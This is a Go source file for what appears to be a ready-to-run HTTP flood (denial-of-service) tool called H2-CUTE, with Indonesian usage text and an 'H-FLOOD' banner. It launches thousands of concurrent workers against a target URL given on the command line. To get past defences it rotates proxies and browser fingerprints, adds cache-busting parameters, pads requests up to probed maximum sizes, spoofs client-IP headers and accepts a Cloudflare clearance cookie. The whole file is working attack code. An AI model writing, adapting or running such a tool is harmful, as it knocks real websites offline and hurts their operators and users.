package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	Reset       = "\033[0m"
	Red         = "\033[31m"
	Green       = "\033[32m"
	White       = "\033[37m"
	RedBright   = "\033[91m"
	RedLight    = "\033[38;5;203m"
	RedPink     = "\033[38;5;204m"
	LightPink   = "\033[38;5;218m"
	WhiteBright = "\033[97m"
)

const (
	wrk = 1500
	to  = 6 * time.Second
	sub = 5
	KEP = 30 * time.Second
)

type BPF struct {
	UA          string
	Accept      string
	Lang        string
	Encoding    string
	SecChUa     string
	SecChUaMov  string
	SecChUaPlat string
}

var PFS = []BPF{
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "macOS",
	},
	{
		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?1",
		SecChUaPlat: "Android",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

var customCookie string
var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

func PMP(target string) int {
	client := &http.Client{
		Timeout: 7 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
	lastSuccess := 0
	for _, size := range sizes {
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&big=" + strings.Repeat("x", size)
		} else {
			testURL += "?big=" + strings.Repeat("x", size)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			lastSuccess = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return lastSuccess
}

func PMH(target string) int {
	client := &http.Client{
		Timeout: 7 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
	lastSuccess := 0
	for _, size := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			lastSuccess = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return lastSuccess
}

func PHR(target string, proxyIP string) map[string]bool {
	client := &http.Client{
		Timeout: 7 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	parsedTarget, _ := url.Parse(target)
	targetHost := parsedTarget.Hostname()

	if proxyIP == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		proxyIP = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}
	headerList := []string{
		"X-Original-URL",
		"X-Forwarded-Host",
		"X-Request-ID",
		"CDN-Loop",
		"CF-Connecting-IP",
		"True-Client-IP",
	}
	result := make(map[string]bool)

	for _, h := range headerList {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")

		switch h {
		case "X-Original-URL":
			req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
		case "X-Forwarded-Host":
			req.Header.Set("X-Forwarded-Host", targetHost)
		case "X-Request-ID":
			req.Header.Set("X-Request-ID", strconv.FormatInt(rand.Int63(), 16))
		case "CDN-Loop":
			req.Header.Set("CDN-Loop", "cloudflare")
		case "CF-Connecting-IP":
			req.Header.Set("CF-Connecting-IP", proxyIP)
		case "True-Client-IP":
			req.Header.Set("True-Client-IP", proxyIP)
		}

		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: H2-CUTE.go <target> <duration> <cookie>")
		fmt.Println("Contoh: H2-CUTE.go https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		customCookie = os.Args[3]
	}

	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}

	var PRX []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				PRX = append(PRX, p)
			}
		}
	}
	if len(PRX) == 0 {
		PRX = append(PRX, nil)
	}

	var proxyIP string
	if len(PRX) > 0 && PRX[0] != nil {
		proxyIP = PRX[0].Hostname()
	}

	maxPayload := PMP(tgt)
	maxHeader := PMH(tgt)
	headerSupport := PHR(tgt, proxyIP)

	wcs := make([]CLI, len(PRX))
	for i, proxyURL := range PRX {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   4 * time.Second,
				KeepAlive: KEP,
			}).DialContext,
			DisableKeepAlives:      false,
			MaxIdleConns:           50000,
			MaxIdleConnsPerHost:    50000,
			MaxConnsPerHost:        0,
			IdleConnTimeout:        KEP,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    false,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 4 * time.Second,
			ExpectContinueTimeout: 0 * time.Second,
		}
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	fmt.Printf("%s", WhiteBright)
	fmt.Println(":::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", LightPink)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", RedPink)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", RedLight)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", Red)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", RedBright)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", Reset)

	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", Red, Reset)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				Green, Reset,
				White, label, Reset,
				Red, Reset,
				White, value, Reset,
				Red, Green, status, Red,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				Green, Reset,
				White, label, Reset,
				Red, Reset,
				White, value, Reset,
			)
		}
	}
	printInfo("Target", host, "")
	printInfo("Port  ", "443         ", "True")
	printInfo("Method", "H-FLOOD     ", "True")
	printInfo("Ulimit", "1048576     ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d         ", len(PRX)), "True")
	printInfo("Worker", fmt.Sprintf("%d        ", wrk), "True")

	if customCookie != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s             [%s%s%s]\n",
			Green, Reset,
			White, Reset,
			Red, Reset,
			Red, Green, "True", Red,
		)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s             [%s%s%s]\n",
			Green, Reset,
			White, Reset,
			Red, Reset,
			White, Red, "None", White,
		)
	}

	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", Red, Reset)

	startTime := time.Now()
	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(startTime).Seconds())
				if elapsed > dur && dur > 0 {
					elapsed = dur
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s      %s[%s%s%s]\033[K",
					Green, Reset,
					White, Reset,
					Red, Reset,
					White, elapsed, dur, Reset,
					Red, Green, "True", Red,
				)
			}
		}
	}()

	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func(subID int) {
					defer swg.Done()
					subRng := rand.New(rand.NewSource(rng.Int63()))

					for ctx.Err() == nil {
						prof := PFS[subRng.Intn(len(PFS))]

						reqURL := tgt

						param := CBP[subRng.Intn(len(CBP))]
						if strings.Contains(reqURL, "?") {
							reqURL += "&" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
						} else {
							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
						}

						if maxPayload > 0 && subRng.Intn(3) == 0 {
							size := maxPayload/2 + subRng.Intn(maxPayload/2)
							if size < 1 {
								size = 64
							}
							reqURL += "&big=" + strings.Repeat("x", size)
						}

						if subRng.Intn(10) == 0 {
							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
						}

						req, _ := http.NewRequest("GET", reqURL, nil)

						req.Header.Set("User-Agent", prof.UA)
						req.Header.Set("Accept", prof.Accept)
						req.Header.Set("Accept-Language", prof.Lang)
						req.Header.Set("Accept-Encoding", prof.Encoding)
						req.Header.Set("Connection", "keep-alive")
						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
						req.Header.Set("Pragma", "no-cache")
						req.Header.Set("Upgrade-Insecure-Requests", "1")
						req.Header.Set("If-Modified-Since", ifModifiedSince)
						req.Header.Set("X-Cache-Buster", strconv.FormatInt(subRng.Int63(), 16))

						if headerSupport["X-Original-URL"] && subRng.Intn(3) == 0 {
							req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(subRng.Int63(), 16))
						}
						if headerSupport["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
							req.Header.Set("X-Forwarded-Host", strconv.FormatInt(subRng.Int63(), 16)+".example.com")
						}
						if headerSupport["X-Request-ID"] && subRng.Intn(3) == 0 {
							req.Header.Set("X-Request-ID", strconv.FormatInt(subRng.Int63(), 16))
						}
						if headerSupport["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
							req.Header.Set("CF-Connecting-IP", cli.ip)
						}
						if headerSupport["True-Client-IP"] && subRng.Intn(5) == 0 {
							req.Header.Set("True-Client-IP", cli.ip)
						}
						if headerSupport["CDN-Loop"] && subRng.Intn(5) == 0 {
							req.Header.Set("CDN-Loop", "cloudflare")
						}

						if subRng.Intn(5) == 0 {
							req.Header.Set("X-Real-IP", cli.ip)
						}

						if maxHeader > 0 && subRng.Intn(2) == 0 {
							size := maxHeader/2 + subRng.Intn(maxHeader/2)
							if size < 1 {
								size = 512
							}
							req.Header.Set("X-Large-Data", strings.Repeat("x", size))
						}

						var cookies []string
						if customCookie != "" {
							cookies = append(cookies, customCookie)
						}
						for _, name := range COOKIES {
							if subRng.Intn(2) == 0 {
								cookies = append(cookies, name+"="+strconv.FormatInt(subRng.Int63(), 16))
							}
						}
						if len(cookies) > 0 {
							req.Header.Set("Cookie", strings.Join(cookies, "; "))
						}

						if subRng.Intn(8) != 0 {
							ref := REF[subRng.Intn(len(REF))]
							req.Header.Set("Referer", ref+host)
						}

						if prof.SecChUa != "" {
							req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
							req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
							req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
						}

						req.Header.Set("Sec-Fetch-Site", "none")
						req.Header.Set("Sec-Fetch-Mode", "navigate")
						req.Header.Set("Sec-Fetch-Dest", "document")

						PID := cli.ip
						if PID == "" {
							PID = RIP(subRng)
						}
						req.Header.Set("X-Forwarded-For", PID)
						req.Header.Set("X-Real-IP", PID)

						resp, err := cli.client.Do(req)
						if err == nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
				}(s)
			}
			swg.Wait()
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}

	wg.Wait()
	fmt.Println()
}
